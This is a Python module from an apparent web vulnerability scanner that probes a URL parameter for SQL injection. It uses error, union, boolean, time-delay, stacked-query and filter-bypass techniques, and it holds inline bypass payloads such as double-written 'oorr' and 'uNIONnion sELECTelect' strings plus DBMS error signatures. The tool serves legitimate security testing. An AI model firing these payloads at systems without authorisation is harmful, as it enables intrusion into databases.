import re, time
from typing import Optional
import requests

from aimy.tools.log_utils import get_logger
from aimy.tools.settings import settings
from aimy.tools.http_client import build_url
from aimy.tools.response_profiler import ResponseProfiler, CLEAN_VALUE
from aimy.tools.payload_engine import (
    generate_sqli_error, generate_sqli_boolean,
    generate_sqli_time, generate_sqli_union, generate_sqli_stacked,
)
from aimy.tools.base_detector import BaseDetector

logger = get_logger("sql_injection")

SQLI_ERROR_PATTERNS = [
    (r"SQL syntax.*MySQL", "MySQL"),
    (r"Warning.*mysql_.*", "MySQL"),
    (r"MySQLSyntaxErrorException", "MySQL"),
    (r"valid MySQL result", "MySQL"),
    (r"check the manual that corresponds to your (MySQL|MariaDB) server", "MySQL"),
    (r"Unknown column '[^']+' in 'field list'", "MySQL"),
    (r"Microsoft OLE DB.*SQL Server", "MSSQL"),
    (r"Unclosed quotation mark after the character string", "MSSQL"),
    (r"mssql_query\(\)", "MSSQL"),
    (r"SQL Server.*Driver.*SQL", "MSSQL"),
    (r"Driver.*SQL Server", "MSSQL"),
    (r"SQL Server.*[0-9a-fA-F]{8}", "MSSQL"),
    (r"PSQLException", "PostgreSQL"),
    (r"PostgreSQL.*ERROR", "PostgreSQL"),
    (r"Warning.*\Wpgsql\W", "PostgreSQL"),
    (r"valid PostgreSQL result", "PostgreSQL"),
    (r"PG::SyntaxError", "PostgreSQL"),
    (r"SQLite/JDBCDriver", "SQLite"),
    (r"SQLite.Exception", "SQLite"),
    (r"System.Data.SQLite", "SQLite"),
    (r"SQLite3::SQLException", "SQLite"),
    (r"SqlException", "MSSQL"),
    (r"System\.Data\.SqlClient", "MSSQL"),
    (r"ORA-[0-9]{5}", "Oracle"),
    (r"Oracle.*Driver", "Oracle"),
    (r"Unclosed quotation mark", "MySQL"),
    (r"unclosed quotation mark", "MySQL"),
    (r"Unterminated string literal", "MySQL"),
    (r"quoted string not properly terminated", "MySQL"),
    (r"Syntax error or access violation", "MySQL"),
    (r"mysql_fetch", "MySQL"),
    (r"mysqli_fetch", "MySQL"),
    (r"supplied argument is not a valid MySQL", "MySQL"),
    (r"Division by zero.*SQL", None),
    (r"Data truncated", None),
    (r"Column count doesn't match", None),
    (r"Table '[^']+' doesn't exist", None),
]

PROFILER = ResponseProfiler()


def _extract_dbms(text: str) -> Optional[str]:
    for pat, dbms in SQLI_ERROR_PATTERNS:
        if dbms and re.search(pat, text, re.IGNORECASE):
            return dbms
    return None


def _measure_baseline_timing(url: str, param: str, sess: requests.Session,
                              timeout: float, post_data: dict = None) -> float:
    samples = []
    for _ in range(2):
        try:
            start = time.time()
            if post_data:
                d = post_data.copy()
                d[param] = CLEAN_VALUE
                sess.post(url, data=d, timeout=timeout)
            else:
                sess.get(build_url(url, param, "1"), timeout=timeout)
            samples.append(time.time() - start)
        except Exception:
            pass
    if not samples:
        return 0.3
    return sum(samples) / len(samples)


class SQLIDetector(BaseDetector):
    """SQL injection detection — inherits baseline from BaseDetector."""

    # Filter bypass payloads (double-write technique)
    BYPASS_PAYLOADS = [
        "' oorr 1=1--",           # double 'or' → survives filter
        "' oorr '1'='1'--",       # double 'or' + string compare
        "' oorr 1=1#",            # MySQL comment variant
        "' oorr 1=1-- -",         # trailing space
        "' aANDnd 1=1--",         # double 'and' → survives filter
        "' uNIONnion sELECTelect 1--",  # double-write union
        "1 oorr 1=1--",           # numeric context
    ]

    # ── Detection methods (was standalone functions) ──────────

    def _detect_error(self, url, param, timeout, post_data, base_data,
                       json_body=False):
        result = {"vulnerable": False, "type": None, "evidence": [],
                  "vector": None, "dbms": None}
        ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page",
                                              "limit", "offset") else "string"
        error_payloads = generate_sqli_error(ctx)
        for payload in error_payloads:
            try:
                if post_data is not None:
                    d = base_data.copy() if base_data else {}
                    d[param] = payload
                    if json_body:
                        r = self.sess.post(url, json=d, timeout=timeout)
                    else:
                        r = self.sess.post(url, data=d, timeout=timeout)
                else:
                    r = self.sess.get(build_url(url, param, payload), timeout=timeout)
                for pat, dbms in SQLI_ERROR_PATTERNS:
                    if re.search(pat, r.text, re.IGNORECASE):
                        if self.is_false_positive(pat, r):
                            logger.debug("sqli error: baseline artifact, skip %s", pat[:30])
                            continue
                        result["vulnerable"] = True
                        result["type"] = "error"
                        result["evidence"].append(payload[:40])
                        result["vector"] = payload
                        result["dbms"] = dbms or _extract_dbms(r.text)
                        return result
            except Exception as e:
                logger.debug("sqli error payload %s: %s", payload[:20], e)
        return result

    def _detect_union(self, url, param, timeout, post_data, base_data, json_body=False):
        result = {"vulnerable": False, "type": None, "evidence": [],
                  "vector": None, "dbms": None}
        ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page",
                                              "limit", "offset") else "string"
        union_payloads = generate_sqli_union(ctx)
        for payload in union_payloads:
            try:
                if post_data is not None:
                    d = base_data.copy() if base_data else {}
                    d[param] = payload
                    r = self.sess.post(url, data=d, timeout=timeout)
                else:
                    r = self.sess.get(build_url(url, param, payload), timeout=timeout)
                for pat, dbms in SQLI_ERROR_PATTERNS:
                    if re.search(pat, r.text, re.IGNORECASE):
                        if self.is_false_positive(pat, r):
                            logger.debug("sqli union: baseline artifact, skip %s", pat[:30])
                            continue
                        result["vulnerable"] = True
                        result["type"] = "error_union"
                        result["evidence"].append("union: %s" % payload[:30])
                        result["vector"] = payload
                        result["dbms"] = dbms or _extract_dbms(r.text)
                        return result
            except Exception as e:
                logger.debug("sqli union %s: %s", payload[:20], e)
        return result

    def _detect_boolean(self, url, param, timeout, post_data, base_data, json_body=False):
        result = {"vulnerable": False, "type": None, "evidence": [], "vector": None}
        ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page",
                                              "limit", "offset") else "string"

        baseline = PROFILER.profile_endpoint(url, param, self.sess, timeout)
        if baseline is None:
            return result

        bool_pairs = generate_sqli_boolean(ctx)
        for true_p, false_p in bool_pairs:
            try:
                if post_data is not None:
                    d = base_data.copy() if base_data else {}
                    d[param] = true_p
                    r_true = self.sess.post(url, data=d, timeout=timeout)
                    d[param] = false_p
                    r_false = self.sess.post(url, data=d, timeout=timeout)
                else:
                    r_true = self.sess.get(build_url(url, param, true_p), timeout=timeout)
                    r_false = self.sess.get(build_url(url, param, false_p), timeout=timeout)

                report_true = PROFILER.analyze(url, param, r_true)
                report_false = PROFILER.analyze(url, param, r_false)

                if report_true.is_anomalous != report_false.is_anomalous:
                    result["vulnerable"] = True
                    result["type"] = "boolean"
                    result["evidence"].append("bool: %s" % true_p[:20])
                    result["vector"] = true_p
                    return result

                diff = abs(len(r_true.text) - len(r_false.text))
                max_len = max(len(r_true.text), len(r_false.text), 1)
                ratio = diff / max_len
                if ratio > 0.03 and diff > 30:
                    result["vulnerable"] = True
                    result["type"] = "boolean"
                    result["evidence"].append("bool: %s (diff=%d, ratio=%.2f%%)" % (
                        true_p[:20], diff, ratio * 100))
                    result["vector"] = true_p
                    return result
            except Exception as e:
                logger.debug("sqli boolean %s: %s", true_p[:20], e)
        return result

    def _detect_stacked(self, url, param, timeout, post_data, base_data, json_body=False):
        result = {"vulnerable": False, "type": None, "evidence": [], "vector": None}
        ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page",
                                              "limit", "offset") else "string"
        stacked_payloads = generate_sqli_stacked(ctx)
        for payload in stacked_payloads:
            try:
                if post_data is not None:
                    d = base_data.copy() if base_data else {}
                    d[param] = payload
                    r = self.sess.post(url, data=d, timeout=timeout)
                else:
                    r = self.sess.get(build_url(url, param, payload), timeout=timeout)
                for pat, dbms in SQLI_ERROR_PATTERNS:
                    if re.search(pat, r.text, re.IGNORECASE):
                        if self.is_false_positive(pat, r):
                            logger.debug("sqli stacked: baseline artifact, skip %s", pat[:30])
                            continue
                        result["vulnerable"] = True
                        result["type"] = "stacked_error"
                        result["evidence"].append("stacked: %s" % payload[:25])
                        result["vector"] = payload
                        return result
            except Exception as e:
                logger.debug("sqli stacked %s: %s", payload[:20], e)
        return result

    def _detect_time(self, url, param, timeout, post_data, base_data, json_body=False):
        result = {"vulnerable": False, "type": None, "evidence": [],
                  "vector": None, "dbms": None}
        baseline_sec = _measure_baseline_timing(url, param, self.sess, timeout, post_data)
        if baseline_sec >= timeout * 0.8:
            return result
        threshold = max(2.0, baseline_sec * 1.5 + 1.5)
        logger.debug("time baseline=%.2fs threshold=%.2fs", baseline_sec, threshold)

        time_payloads = generate_sqli_time()
        for payload in time_payloads:
            try:
                start_t = time.time()
                if post_data is not None:
                    d = base_data.copy() if base_data else {}
                    d[param] = payload
                    r = self.sess.post(url, data=d, timeout=timeout + 3)
                else:
                    r = self.sess.get(build_url(url, param, payload), timeout=timeout + 3)
                elapsed = time.time() - start_t
                if elapsed >= threshold:
                    result["vulnerable"] = True
                    result["type"] = "time"
                    result["evidence"].append("time: %.1fs (baseline=%.1fs)" % (
                        elapsed, baseline_sec))
                    result["vector"] = payload
                    if "SLEEP" in payload:
                        result["dbms"] = "MySQL"
                    elif "pg_sleep" in payload:
                        result["dbms"] = "PostgreSQL"
                    elif "WAITFOR" in payload:
                        result["dbms"] = "MSSQL"
                    return result
            except requests.Timeout:
                pass
            except Exception as e:
                logger.debug("sqli time %s: %s", payload[:20], e)
        return result

    def _detect_bypass(self, url, param, timeout, post_data, base_data, json_body=False):
        """Try filter-bypass payloads (double-write etc)."""
        result = {"vulnerable": False, "type": None, "evidence": [],
                  "vector": None, "dbms": None}
        for payload in self.BYPASS_PAYLOADS:
            try:
                if post_data is not None:
                    d = base_data.copy() if base_data else {}
                    d[param] = payload
                    if json_body:
                        r = self.sess.post(url, json=d, timeout=timeout)
                    else:
                        r = self.sess.post(url, data=d, timeout=timeout)
                else:
                    r = self.sess.get(build_url(url, param, payload), timeout=timeout)
                # Success indicator: response size significantly > baseline
                if self._baseline_size and len(r.text) > self._baseline_size * 1.5:
                    result["vulnerable"] = True
                    result["type"] = "filter_bypass"
                    result["evidence"].append(
                        "bypass: %s → %dB (baseline %dB)" % (
                            payload[:25], len(r.text), self._baseline_size))
                    result["vector"] = payload
                    return result
                # Also check for SQL error patterns
                for pat, dbms in SQLI_ERROR_PATTERNS:
                    if re.search(pat, r.text, re.IGNORECASE):
                        result["vulnerable"] = True
                        result["type"] = "filter_bypass_error"
                        result["evidence"].append("bypass+error: %s" % payload[:25])
                        result["vector"] = payload
                        return result
            except Exception as e:
                logger.debug("sqli bypass %s: %s", payload[:20], e)
        return result

    # ── Template method ───────────────────────────────────────

    def _check_impl(self, url: str, param: str, **kwargs) -> dict:
        timeout = kwargs.get("timeout", 10.0)
        post_body = kwargs.get("post_body", False)
        post_data = kwargs.get("post_data")
        json_body = kwargs.get("json_body", False)
        waf_name = kwargs.get("waf_name")

        result = {"vulnerable": False, "type": None, "evidence": [],
                  "vector": None, "dbms": None}

        base_data = post_data.copy() if post_body and post_data else None
        post_d = post_data if post_body else None

        detectors = [
            ("bypass", self._detect_bypass),   # fastest, highest hit rate
            ("error", self._detect_error),
            ("time", self._detect_time),
            ("boolean", self._detect_boolean),
            ("union", self._detect_union),
            ("stacked", self._detect_stacked),
        ]

        for det_name, det_func in detectors:
            r = det_func(url, param, timeout, post_d, base_data, json_body)
            if r["vulnerable"]:
                result.update(r)
                break

        return result


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, post_body: bool = False, post_data: dict = None,
          waf_name: Optional[str] = None, json_body: bool = False) -> dict:
    """Backward-compatible module-level API."""
    return SQLIDetector().check(url, param, sess=sess, timeout=timeout,
                                post_body=post_body, post_data=post_data,
                                waf_name=waf_name, json_body=json_body)
